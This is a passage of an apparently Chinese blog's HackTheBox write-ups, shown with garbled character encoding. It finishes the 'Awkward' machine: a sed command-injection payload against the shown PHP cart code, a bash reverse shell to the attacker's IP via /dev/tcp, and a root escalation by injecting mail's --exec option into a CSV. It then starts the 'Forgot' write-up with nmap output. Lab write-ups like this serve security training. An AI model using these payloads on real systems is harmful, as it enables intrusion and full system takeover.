    <span class="token variable">$item_id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'item'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$user_id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$bad_chars</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&amp;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"|"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&gt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&lt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"*"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"?"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"`"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"$"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"("</span><span class="token punctuation">,</span><span class="token string double-quoted-string">")"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"{"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"}"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"["</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"]"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"!"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//no hacking allowed!!</span>

    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$bad_chars</span> <span class="token keyword">as</span> <span class="token variable">$bad</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$item_id</span><span class="token punctuation">,</span> <span class="token variable">$bad</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Bad character detected!"</span><span class="token punctuation">;</span>
            <span class="token keyword">exit</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$bad_chars</span> <span class="token keyword">as</span> <span class="token variable">$bad</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$user_id</span><span class="token punctuation">,</span> <span class="token variable">$bad</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Bad character detected!"</span><span class="token punctuation">;</span>
            <span class="token keyword">exit</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">checkValidItem</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$STORE_HOME</span><span class="token punctuation">}</span></span>cart/<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$user_id</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sed -i '/item_id=<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$item_id</span><span class="token punctuation">}</span></span>/d' <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$STORE_HOME</span><span class="token punctuation">}</span></span>cart/<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$user_id</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Item removed from cart"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Invalid item"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">//fetch from cart</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'GET'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'fetch_items'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$html</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
    <span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$STORE_HOME</span><span class="token punctuation">}</span></span>cart"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">array_slice</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$user_id</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user_id</span> <span class="token operator">===</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">checkValidItem</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$STORE_HOME</span><span class="token punctuation">}</span></span>cart/<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$user_id</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$product_file</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$STORE_HOME</span><span class="token punctuation">}</span></span>cart/<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$file</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$details</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$line</span> <span class="token operator">=</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$product_file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\r"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$line</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string double-quoted-string">"***Hat Valley Cart***"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">//don't include first line</span>
                    <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$details</span><span class="token punctuation">,</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\r"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$line</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$details</span> <span class="token keyword">as</span> <span class="token variable">$cart_item</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                 <span class="token variable">$cart_items</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&amp;"</span><span class="token punctuation">,</span> <span class="token variable">$cart_item</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                 <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$x</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$x</span> <span class="token operator">&lt;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$cart_items</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$x</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                      <span class="token variable">$cart_items</span><span class="token punctuation">[</span><span class="token variable">$x</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"="</span><span class="token punctuation">,</span> <span class="token variable">$cart_items</span><span class="token punctuation">[</span><span class="token variable">$x</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//key and value as separate values in subarray</span>
                 <span class="token punctuation">}</span>
                 <span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;tr&gt;&lt;td&gt;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$cart_items</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>&lt;/td&gt;&lt;td&gt;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$cart_items</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>&lt;/td&gt;&lt;td&gt;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$cart_items</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>&lt;/td&gt;&lt;td&gt;&lt;button data-id=<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$cart_items</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span> onclick=\"removeFromCart(this, localStorage.getItem('user'))\" class='remove-item'&gt;Remove&lt;/button&gt;&lt;/td&gt;&lt;/tr&gt;"</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">echo</span> <span class="token variable">$html</span><span class="token punctuation">;</span>
    <span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="å…­ã€RCE"><a href="#å…­ã€RCE" class="headerlink" title="å…­ã€RCE"></a>å…­ã€RCE</h2><p>å®¡è®¡ï¼Œå…¶ä¸­åœ¨åˆ é™¤è´­ç‰©è½¦ä¿¡æ¯çš„æ—¶å€™ï¼Œä¼šæ‰§è¡Œå¦‚ä¸‹ä»£ç </p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">system("sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}");
æ³¨ï¼š
'/item_id={$item_id}/d'				#åˆ é™¤item_id={$item_id}çš„è¡Œ
-i {$STORE_HOME}cart/{$user_id}		#è¡¨ç¤ºè¦æ“ä½œçš„ç›®æ ‡æ–‡ä»¶<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>æˆ‘ä»¬å¯ä»¥æ·»åŠ ä¸€ä¸ªå•†å“åˆ°è´­ç‰©è½¦ï¼Œåˆ†æä¸€ä¸‹è¿‡ç¨‹ã€‚å¦‚ä¸‹å›¾ç‚¹å‡»<code>ADD TO CART</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230304093729084.png"></p>
<p>ç„¶ååˆ°beanç”¨æˆ·çš„sshçª—å£æŸ¥çœ‹<code>/var/www/store/cart</code>ï¼ˆç”±ä¸Šé¢çš„<code>README.md</code>æ–‡ä»¶æˆ–è€…<code>cart_actions.php</code>å¯ä»¥åˆ†æå‡ºè¿™ä¸ªè·¯å¾„ï¼‰ï¼Œå¯ä»¥çœ‹åˆ°æ–‡ä»¶åä¸º<code>959e-8a52-2e0-fc52</code>ï¼Œä¹Ÿå°±æ˜¯<code>$user_id</code>çš„å€¼ï¼Œæ–‡ä»¶å†…å®¹é‡Œ<code>item_id=1</code></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">bean@awkward:/var/www/store/cart$ ls
959e-8a52-2e0-fc52
bean@awkward:/var/www/store/cart$ cat 959e-8a52-2e0-fc52 
***Hat Valley Cart***
item_id=1&amp;item_name=Yellow Beanie&amp;item_brand=Good Doggo&amp;item_price=$39.90<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä»£ç ä¸­<code>item_id=1</code>ä¼šè¢«ä»£å…¥sedå‘½ä»¤æ‰§è¡Œï¼Œè™½ç„¶æœ‰è¿‡æ»¤ï¼Œä½†æ˜¯å¯ä»¥é—­åˆç»•è¿‡ï¼Œè¿™é‡Œå°±æ˜¯å¯æ“ä½œçš„åœ°æ–¹ã€‚ç»è¿‡æµ‹è¯•ï¼Œå¯¹äºåŒä¸€ä¸ªç”¨æˆ·<code>$user_id</code>çš„å€¼ä¸ä¼šå˜ï¼Œè€Œä¸”beanæ²¡æœ‰ä¿®æ”¹è´­ç‰©è½¦æ–‡ä»¶çš„æƒé™ï¼Œä½†æ˜¯å¯ä»¥å…ˆåˆ é™¤ï¼Œç„¶åé‡æ–°å†™ä¸€ä¸ªç›¸åŒæ–‡ä»¶åçš„æ–‡ä»¶ï¼Œå¦‚ä¸‹</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">bean@awkward:/var/www/store$ rm -rf cart/959e-8a52-2e0-fc52
bean@awkward:/var/www/store$ nano cart/959e-8a52-2e0-fc52
bean@awkward:/var/www/store$ cat cart/959e-8a52-2e0-fc52
***Hat Valley Cart***
item_id=1' -e "1e /tmp/shell.sh" /tmp/shell.sh '&amp;item_name=Yellow Beanie&amp;item_brand=Good Doggo&amp;item_price=$39.90<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ„é€ payloadå¯å‚è€ƒï¼š<a href="https://gtfobins.github.io/gtfobins/sed/">https://gtfobins.github.io/gtfobins/sed/</a></p>
<p>æˆ‘ä»¬æ„é€ çš„payloadåŠæœ€ç»ˆä»£å…¥sedå‘½ä»¤çš„æ•ˆæœå¦‚ä¸‹</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">item_id=1' -e "1e /tmp/shell.sh" /tmp/shell.sh '
sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}
sed -i '1' -e "1e /tmp/shell.sh" /tmp/shell.sh '' /var/www/store/cart/959e-8a52-2e0-fc52
æ³¨ï¼š
-e&lt;script&gt;æˆ–--expression=&lt;script&gt;è¡¨ç¤ºä»¥é€‰é¡¹ä¸­æŒ‡å®šçš„scriptæ¥å¤„ç†è¾“å…¥çš„æ–‡æœ¬æ–‡ä»¶<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ²¡æœ‰vimï¼Œé‚£å°±ç”¨nanoåœ¨<code>/tmp</code>ç›®å½•å†™å…¥åå¼¹shellæ–‡ä»¶<code>shell.sh</code>ï¼Œå¹¶æ·»åŠ å¯æ‰§è¡Œæƒé™</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">bean@awkward:/tmp$ nano shell.sh
bean@awkward:/tmp$ cat shell.sh 
#!/bin/bash
bash -i &gt;&amp; /dev/tcp/[æœ¬åœ°IP]/[æƒ³è¦ç›‘å¬çš„PORT] 0&gt;&amp;1

bean@awkward:/tmp$ ls -l shell.sh 
-rw-rw-r-- 1 bean bean 55 Mar  4 12:29 shell.sh
bean@awkward:/tmp$ chmod +x shell.sh 
bean@awkward:/tmp$ ls -l shell.sh 
-rwxrwxr-x 1 bean bean 55 Mar  4 12:29 shell.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¼€å¯ncç›‘å¬</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nc -nvlp 9001<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æ‰“å¼€Burpsuiteï¼Œç„¶åæ‰“å¼€å¦‚ä¸‹è´­ç‰©è½¦ç•Œé¢ï¼Œç‚¹å‡»<code>Remove</code>çš„åŒæ—¶æˆªè·è¯·æ±‚</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230304094937675.png"></p>
<p>ä¿®æ”¹è¯·æ±‚æ•°æ®å¦‚ä¸‹</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">item=1'+-e+"1e+/tmp/shell.sh"+/tmp/shell.sh+'&amp;user=959e-8a52-2e0-fc52&amp;action=delete_item<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230304113424258.png"></p>
<p>æ‹¿åˆ°www-dataç”¨æˆ·æƒé™</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230304102656231.png"></p>
<p>æœ¬åœ°ä¸‹ä¸€ä¸ª<a href="https://github.com/DominicBreuker/pspy">pspy64</a>ï¼Œç„¶åå¼€å¯80æœåŠ¡ç›‘å¬ï¼Œå†ç„¶ååˆ°beanç”¨æˆ·çš„sshçª—å£ç”¨wgetä»æœ¬åœ°ä¸‹è½½pspy64</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230304103703710.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230304133818669.png"></p>
<p>ç„¶ååœ¨www-dataç”¨æˆ·çª—å£æ‰§è¡Œpspy64ï¼Œçœ‹åˆ°inotifywaitå·¥å…·åœ¨ç›‘å¬<code>/var/www/private/leave_requests.csv</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230304114139856.png"></p>
<p>æŸ¥çœ‹<code>/var/www/private/leave_requests.csv</code>å†…å®¹å¦‚ä¸‹ï¼Œå¯çœ‹åˆ°æ˜¯<code>Leave Request Database</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230304134931478.png"></p>
<p>å†çœ‹åˆ°æœ‰mailå‘½ä»¤åœ¨å‘é€é‚®ä»¶ï¼Œæ¨æµ‹æ˜¯ä»<code>Leave Request Database</code>è¯»å–ï¼Œç„¶åå‘é€ã€‚mailå‘½ä»¤å¯ä»¥æ‰§è¡Œæ–‡ä»¶ï¼Œå‚è€ƒï¼š<a href="https://gtfobins.github.io/gtfobins/mail/">https://gtfobins.github.io/gtfobins/mail/</a></p>
<p>æˆ‘ä»¬å¯ä»¥å†™å…¥åå¼¹shellæ–‡ä»¶</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230304115141104.png"></p>
<p>æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œå°†æ‰§è¡Œåå¼¹shellçš„å‘½ä»¤å†™å…¥<code>leave_requests.csv</code></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">www-data@awkward:~/private$ echo '" --exec="\!/tmp/shell.sh"' &gt;&gt; leave_requests.csv
&lt; '" --exec="\!/tmp/shell.sh"' &gt;&gt; leave_requests.csv
www-data@awkward:~/private$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>ç„¶åå¼€å¯ç›‘å¬ï¼Œç¨ç­‰ç‰‡åˆ»å°±ä¼šæ‹¿åˆ°rootæƒé™</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230304115919562.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230304115938244.png"></p>
<p>Overï¼</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://0xdedinfosec.vercel.app/blog/hackthebox-awkward-writeup#cracking-jwt-secret">https://0xdedinfosec.vercel.app/blog/hackthebox-awkward-writeup#cracking-jwt-secret</a></p>
<p><a href="https://systemweakness.com/hack-the-box-htb-writeup-awkward-3542681d9795">https://systemweakness.com/hack-the-box-htb-writeup-awkward-3542681d9795</a></p>
<p><a href="https://gtfobins.github.io/#sed">https://gtfobins.github.io/#sed</a></p>
<p><a href="https://gtfobins.github.io/gtfobins/sed/">https://gtfobins.github.io/gtfobins/sed/</a></p>
<p><a href="https://gtfobins.github.io/gtfobins/mail/">https://gtfobins.github.io/gtfobins/mail/</a></p>
]]></content>
      <categories>
        <category>é¶æœº</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>LFI</tag>
        <tag>Nginx</tag>
        <tag>JWTä¼ªé€ </tag>
        <tag>SSRF</tag>
        <tag>awkå‘½ä»¤</tag>
        <tag>sedå‘½ä»¤RCE</tag>
        <tag>mailå‘½ä»¤</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Forgot</title>
    <url>/posts/7f4bdc86.html</url>
    <content><![CDATA[<h1 id="HTB-Forgot"><a href="#HTB-Forgot" class="headerlink" title="HTB-Forgot"></a>HTB-Forgot</h1><h2 id="ä¸€ã€æ€è·¯æ¦‚è¦"><a href="#ä¸€ã€æ€è·¯æ¦‚è¦" class="headerlink" title="ä¸€ã€æ€è·¯æ¦‚è¦"></a>ä¸€ã€æ€è·¯æ¦‚è¦</h2><ol>
<li>ä¿¡æ¯æœé›†æš´éœ²ä¿¡æ¯ï¼š<br>â‘ é¡µé¢æºç æš´éœ²ç”¨æˆ·robert-dev-14522ï¼›<br>â‘¡æš´éœ²varnishåå‘ä»£ç†ç¼“å­˜å¯åˆ©ç”¨ç‚¹ï¼ˆè·¯å¾„åŒ¹é…<code>/script</code>ï¼‰ï¼›</li>
<li>é‡ç½®å¯†ç åŠŸèƒ½æŠ•æ¯’æˆåŠŸä¿®æ”¹robert-dev-14522å¯†ç ï¼Œç™»å½•ç½‘ç«™ï¼›</li>
<li>Varnishç¼“å­˜æ¬ºéª—ç™»å½•adminç”¨æˆ·ï¼Œè·å–SSHç”¨æˆ·diegoï¼›</li>
<li>SSHè¿æ¥å‘ç°å…³é”®æ–‡ä»¶<code>ml_security.py</code>ï¼›</li>
<li>ä»£ç å®¡è®¡+CVE-2022-29216å‘½ä»¤æ‰§è¡Œåå¼¹shellè·å–rootæƒé™ã€‚</li>
</ol>
<h2 id="äºŒã€ä¿¡æ¯æœé›†"><a href="#äºŒã€ä¿¡æ¯æœé›†" class="headerlink" title="äºŒã€ä¿¡æ¯æœé›†"></a>äºŒã€ä¿¡æ¯æœé›†</h2><p>nmap</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# nmap -sC -sV 10.10.11.188
Starting Nmap 7.91 ( https://nmap.org ) at 2023-03-06 02:21 EST
Nmap scan report for 10.10.11.188
Host is up (0.62s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    Werkzeug/2.1.2 Python/3.8.10
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/2.1.2 Python/3.8.10
|     Date: Mon, 06 Mar 2023 07:20:37 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     X-Varnish: 493857 493844
|     Age: 71
|     Via: 1.1 varnish (Varnish/6.2)
|     Connection: close
|     &lt;!doctype html&gt;
|     &lt;html lang=en&gt;
|     &lt;title&gt;404 Not Found&lt;/title&gt;
|     &lt;h1&gt;Not Found&lt;/h1&gt;
|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
|   GetRequest: 
|     HTTP/1.1 302 FOUND
|     Server: Werkzeug/2.1.2 Python/3.8.10
|     Date: Mon, 06 Mar 2023 07:21:38 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 219
|     Location: http://127.0.0.1
|     X-Varnish: 493852
|     Age: 0
|     Via: 1.1 varnish (Varnish/6.2)
|     Connection: close
|     &lt;!doctype html&gt;
|     &lt;html lang=en&gt;
|     &lt;title&gt;Redirecting...&lt;/title&gt;
|     &lt;h1&gt;Redirecting...&lt;/h1&gt;
|     &lt;p&gt;You should be redirected automatically to the target URL: &lt;a href="http://127.0.0.1"&gt;http://127.0.0.1&lt;/a&gt;. If not, click the link.
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.8.10
|     Date: Mon, 06 Mar 2023 07:21:40 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, GET, HEAD
|     Content-Length: 0
|     X-Varnish: 264229
|     Age: 0
|     Via: 1.1 varnish (Varnish/6.2)
|     Accept-Ranges: bytes
|     Connection: close
|   RTSPRequest, SIPOptions: 
|_    HTTP/1.1 400 Bad Request
|_http-server-header: Werkzeug/2.1.2 Python/3.8.10
|_http-title: Login
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
......
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 190.69 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

